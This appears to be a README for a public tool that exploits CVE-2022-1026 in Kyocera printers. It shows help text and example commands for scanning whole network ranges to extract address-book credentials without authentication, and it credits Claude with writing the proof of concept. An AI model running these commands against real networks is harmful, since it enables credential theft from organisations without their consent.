# KyoceraCredsDump - CVE-2022-1026
- Based on the original exploit from Aaron Herndon, @ac3lives (Rapid7) - https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/
- credits to Aaron Herndon / https://twitter.com/ac3lives / https://github.com/ac3lives/kyocera-cve-2022-1026
- Thanks claude for creating the refined PoC for me ;)

- Since I still encounter kyocera printers vulnerable to this exploit everyday, I wanted to have a more refined PoC, that allows for scanning of network ranges or multiple hosts and also prettifies the acquired credentials for quick summary.

## Usage
```
python3 KyoceraCredsDump.py -h
usage: getKyoceraCreds.py [-h] -t TARGET [-p PORT] [--timeout TIMEOUT] [--connect-timeout CONNECT_TIMEOUT] [--workers WORKERS] [--no-probe]

Kyocera printer address-book credential extractor (unauthenticated SOAP)

options:
  -h, --help            show this help message and exit
  -t, --target TARGET   Target spec: IP, CIDR, dash-range, or comma list (see examples below)
  -p, --port PORT       TCP port of the Kyocera SOAP service (default: 9091)
  --timeout TIMEOUT     HTTP timeout in seconds for the exploit (default: 10)
  --connect-timeout CONNECT_TIMEOUT
                        TCP connect-timeout for pre-flight port probe in seconds (default: 1.0)
  --workers WORKERS     Concurrent workers for port probe and exploitation (default: 50)
  --no-probe            Skip pre-flight TCP probe, exploit every target

Target formats (used with -t/--target):
  Single IP:    172.16.2.5
  CIDR:         172.16.2.0/24
  Range:        172.16.2.1-172.16.2.10   or   172.16.2.1-10
  Comma list:   172.16.2.1,172.16.2.2,172.16.2.50
  Mix:          172.16.2.0/28,172.16.3.5,172.16.4.1-10

Examples:
  python3 getKyoceraCreds.py -t 172.16.2.0/24
  python3 getKyoceraCreds.py -t 172.16.2.1-172.16.2.10
  python3 getKyoceraCreds.py -t 172.16.2.1,172.16.2.2,172.16.2.50
  python3 getKyoceraCreds.py -t 172.16.2.5 -p 443
  python3 getKyoceraCreds.py -t 172.16.2.0/24 --workers 100 --connect-timeout 1
```
